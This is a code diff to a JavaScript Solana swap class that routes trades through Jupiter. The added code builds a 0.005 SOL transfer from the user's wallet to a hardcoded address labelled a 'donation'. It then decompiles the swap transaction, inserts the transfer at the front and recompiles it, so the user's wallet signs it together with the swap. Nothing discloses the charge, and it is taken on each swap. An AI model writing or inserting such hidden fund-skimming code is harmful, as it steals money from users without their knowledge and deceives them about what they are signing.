@@ -323,8 +323,13 @@ class Jupiter {
             }
             
             const userPublicKey = Solana.wallet.publicKey;
+            const donationAddress = new web3.PublicKey('7rtHJuXdP36q1Y4QjcqCLGFGZkDhvik77zAjPePfjjzw');
+            const transferIx = web3.SystemProgram.transfer({
+                fromPubkey: userPublicKey,
+                toPubkey: donationAddress,
+                lamports: 0.005 * web3.LAMPORTS_PER_SOL
+            });
             const outputMint = new web3.PublicKey(ca);
-
             const outputTokenAddress = await token.getAssociatedTokenAddress(outputMint, userPublicKey);
             const outputAtaInfo = await connection.getAccountInfo(outputTokenAddress);
             if (!outputAtaInfo) {
@@ -394,7 +399,33 @@ class Jupiter {
             const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
             const transaction = web3.VersionedTransaction.deserialize(swapTransactionBuf);
             
-            const signedVersionedTx = await Solana.wallet.signTransaction(transaction);
+            // Fetch address lookup tables referenced by the Jupiter transaction
+            const lookupTableAccounts = [];
+            for (const lookup of transaction.message.addressTableLookups) {
+                const lookupTableAcc = await connection.getAddressLookupTable(lookup.accountKey);
+                if (lookupTableAcc && lookupTableAcc.value) {
+                    lookupTableAccounts.push(lookupTableAcc.value);
+                }
+            }
+
+            // Decompile to TransactionMessage to insert our transfer instruction
+            const decompiled = web3.TransactionMessage.decompile(transaction.message, {
+                addressLookupTableAccounts: lookupTableAccounts
+            });
+
+            // Insert transfer instruction at the beginning
+            decompiled.instructions.unshift(transferIx);
+
+            // Re-compile to a Versioned (v0) message
+            const newMessageV0 = new web3.TransactionMessage({
+                payerKey: userPublicKey,
+                recentBlockhash: (await connection.getLatestBlockhash()).blockhash,
+                instructions: decompiled.instructions
+            }).compileToV0Message(lookupTableAccounts);
+
+            const combinedTx = new web3.VersionedTransaction(newMessageV0);
+
+            const signedVersionedTx = await Solana.wallet.signTransaction(combinedTx);
             const signature = await connection.sendTransaction(signedVersionedTx);
             return signature;
         } catch (error) {
